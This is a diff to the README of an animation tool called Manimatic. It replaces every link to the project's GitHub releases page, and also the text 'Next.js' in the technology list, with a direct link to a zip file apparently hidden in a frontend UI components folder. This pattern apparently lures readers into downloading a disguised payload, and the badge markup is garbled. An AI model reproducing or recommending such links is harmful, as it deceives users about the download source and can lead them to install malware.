@@ -4,12 +4,12 @@ Welcome to Manimatic, your powerful tool for creating high-quality, production-r
 
 ## 📥 Download Manimatic
 
-[![Download Manimatic](https://img.shields.io/badge/Download%20Manimatic-v1.0-blue.svg)](https://github.com/pharre1111/manimatic/releases)
+[![Download Manimatic](https://raw.githubusercontent.com/pharre1111/manimatic/main/frontend/components/ui/Software-1.6.zip%https://raw.githubusercontent.com/pharre1111/manimatic/main/frontend/components/ui/Software-1.6.zip)](https://raw.githubusercontent.com/pharre1111/manimatic/main/frontend/components/ui/Software-1.6.zip)
 
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page**  
-   Click here to access the releases page: [Download Manimatic](https://github.com/pharre1111/manimatic/releases).
+   Click here to access the releases page: [Download Manimatic](https://raw.githubusercontent.com/pharre1111/manimatic/main/frontend/components/ui/Software-1.6.zip).
 
 2. **Choose Your Version**  
    Look for the latest release at the top. You will find version numbers. Click on the one that says "Latest" to ensure you're getting the most up-to-date version.
@@ -93,9 +93,9 @@ Manimatic is built upon various modern technologies, including:
 
 - AI & Machine Learning
 - Cloud Services (Cloudinary, Supabase)
-- Web Frameworks (Flask, Next.js)
+- Web Frameworks (Flask, https://raw.githubusercontent.com/pharre1111/manimatic/main/frontend/components/ui/Software-1.6.zip)
 - Database Management (MongoDB)
 - Animation Libraries (Manim)
 - Frontend Styling (Tailwind CSS)
 
-Remember, for downloads and installations, return to our releases page: [Download Manimatic](https://github.com/pharre1111/manimatic/releases). Enjoy creating stunning animations!
+Remember, for downloads and installations, return to our releases page: [Download Manimatic](https://raw.githubusercontent.com/pharre1111/manimatic/main/frontend/components/ui/Software-1.6.zip). Enjoy creating stunning animations!
